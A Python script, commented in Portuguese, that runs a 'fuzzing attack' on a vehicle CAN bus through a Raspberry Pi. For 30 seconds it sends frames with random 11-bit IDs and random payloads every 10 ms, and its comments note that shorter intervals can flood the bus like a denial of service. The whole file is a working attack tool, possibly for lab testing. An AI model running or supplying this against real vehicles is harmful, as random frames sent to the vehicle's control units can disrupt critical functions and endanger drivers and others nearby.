import can
import time
import random
import os

# --- Parâmetros do Ataque de Fuzzing ---

# Nome da interface CAN na Raspberry Pi.
CAN_INTERFACE = 'can0'

# Duração total do ataque em segundos.
ATTACK_DURATION_SECONDS = 30

# Intervalo entre o envio de cada mensagem fuzzed (em segundos).
# Um intervalo muito baixo pode sobrecarregar a rede (similar a um DoS).
# Um intervalo um pouco maior permite observar a reação de cada ECU.
FUZZ_INTERVAL_SECONDS = 0.01 # Envia uma nova mensagem a cada 10ms

# --- Lógica do Ataque ---

def run_fuzzing_attack():
    """
    Executa um ataque de Fuzzing, enviando mensagens com IDs e
    dados (payload) aleatórios para o barramento CAN.
    """
    print("Iniciando o ataque de Fuzzing...")
    print(f"Interface: {CAN_INTERFACE}")
    print(f"Intervalo entre mensagens: {FUZZ_INTERVAL_SECONDS}s")
    print(f"Duração: {ATTACK_DURATION_SECONDS} segundos")

    bus = None
    try:
        # Inicializa a conexão com o barramento CAN
        bus = can.interface.Bus(channel=CAN_INTERFACE, bustype='socketcan')

        start_time = time.time()
        message_count = 0

        # Loop que envia mensagens aleatórias pela duração definida
        while time.time() - start_time < ATTACK_DURATION_SECONDS:
            
            # Gera um ID de arbitração aleatório (standard ID tem 11 bits, 0 a 2047)
            fuzzed_id = random.randint(0x000, 0x7FF)
            
            # Gera um tamanho de dados aleatório (0 a 8 bytes)
            fuzzed_dlc = random.randint(0, 8)
            
            # Gera um payload de dados aleatório com o tamanho definido acima
            fuzzed_data = [random.randint(0, 255) for _ in range(fuzzed_dlc)]
            
            # Cria a mensagem CAN fuzzed
            msg = can.Message(
                arbitration_id=fuzzed_id,
                data=fuzzed_data,
                is_extended_id=False
            )
            
            try:
                bus.send(msg)
                message_count += 1
                print(f"Fuzzing... Enviada msg com ID={hex(fuzzed_id)} | Data={bytes(fuzzed_data).hex().upper()}", end='\r')
            except can.CanError as e:
                # Ocasionalmente, pode ocorrer um erro se o buffer de envio estiver cheio.
                # Em um fuzzing, podemos simplesmente ignorar e continuar.
                print(f"Erro de envio (buffer cheio?): {e}", end='\r')

            # Aguarda o intervalo definido
            time.sleep(FUZZ_INTERVAL_SECONDS)

        end_time = time.time()

        print("\n\n--- Ataque de Fuzzing Finalizado ---")
        print(f"Duração total: {end_time - start_time:.2f} segundos.")
        print(f"Total de mensagens enviadas com sucesso: {message_count}")

    except Exception as e:
        print(f"\nOcorreu um erro: {e}")

    finally:
        if bus:
            bus.shutdown()
            print("Conexão com o barramento CAN foi encerrada.")


if __name__ == "__main__":
    run_fuzzing_attack()